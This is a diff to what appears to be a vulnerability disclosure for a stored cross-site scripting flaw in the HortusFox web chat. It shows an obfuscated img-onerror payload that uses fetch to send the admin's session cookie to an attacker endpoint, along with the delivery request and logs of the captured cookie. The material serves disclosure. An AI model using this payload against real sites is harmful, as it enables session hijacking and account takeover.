@@ -45,8 +45,10 @@ Verified on the official `ghcr.io/danielbrendel/hortusfox-web:v6.3` image with i
 **Step 1: attacker (regular member) posts the payload**
 
 ```python
-PAYLOAD = ('<img src=x onerror="fetch((\'ht\'+\'tp://127.0.0.1:9913\')'
-           '+\'/steal?c=\'+encodeURIComponent(document.cookie))">')
+PAYLOAD = ('<img src=x onerror="'
+           'fetch((\'ht\'+\'tp://127.0.0.1:9913\')+\'/steal?c=\'+encodeURIComponent(document.cookie));'
+           'alert(document.cookie)">'
+           '<span data-xss=stored>')
 POST /chat/add  (form: message=<payload>, csrf_token=<attacker's token>)
 ```
 
@@ -54,7 +56,7 @@ POST /chat/add  (form: message=<payload>, csrf_token=<attacker's token>)
 
 ```
 -- [1] GET /chat/query as admin --
-    raw fragment: {"code":200,"messages":[..., "message":"<img src=x onerror=\"fetch(...">
+    raw fragment: {"code":200,"messages":[..., "message":"<img src=x onerror=\"fetch(...);alert(document.cookie)\">
     [VULN] payload returned verbatim (client renders it via innerHTML)
 ```
 
@@ -69,15 +71,17 @@ POST /chat/add  (form: message=<payload>, csrf_token=<attacker's token>)
 ```
 -- [3-live] admin browser is on /chat; attacker posts the payload now --
     [~] live payload re-delivered while the admin browser polls /chat
-    [VULN] payload executed in the admin browser; exfil request observed:
-     /steal?c=PHPSESSID%3Dc54606f68495e52f2d9c06a7aac8cfa1%3B%20COOKIE_LOCALE%3Den
+    [VULN] payload executed in the admin browser (alert visible); exfil request observed:
+     /steal?c=COOKIE_LOCALE%3Den%3B%20PHPSESSID%3D9594f5a59563b5616469b3ad0db68d9a%3B%20adminer_version%3D6.1.1
 
 VERDICT: stored-raw=True, purify-contrast=True, executed-in-browser=True
 ```
 
-**Real-environment reproduction** (the product itself, run for this test): the payload was stored through the product's own chat form, returned unpurified by `/chat/query`, and executed in a real logged-in administrator browser session — the `onerror` handler fired and delivered the admin's session cookie to the attacker endpoint. The server-rendered view's purification of the identical message confirms the escaping gap is specific to the AJAX render path.
+**Real-environment reproduction** (the product itself, run for this test): the payload was stored through the product's own chat form, returned unpurified by `/chat/query`, and executed in a real logged-in administrator browser session (Safari) — while the admin read the chat, the polling render path injected the stored message as live HTML: the `onerror` handler raised a JavaScript `alert(document.cookie)` dialog showing the admin's session cookie on screen and delivered the same cookie to the attacker endpoint. The server-rendered view's purification of the identical message confirms the escaping gap is specific to the AJAX render path.
 
 ![Real-environment verification](hortusfox_chat_stored_xss.png)
+
+![Alert dialog raised by the stored payload in the administrator's browser, showing the admin session cookie](hortusfox_chat_stored_xss_alert.png)
 
 ---
 
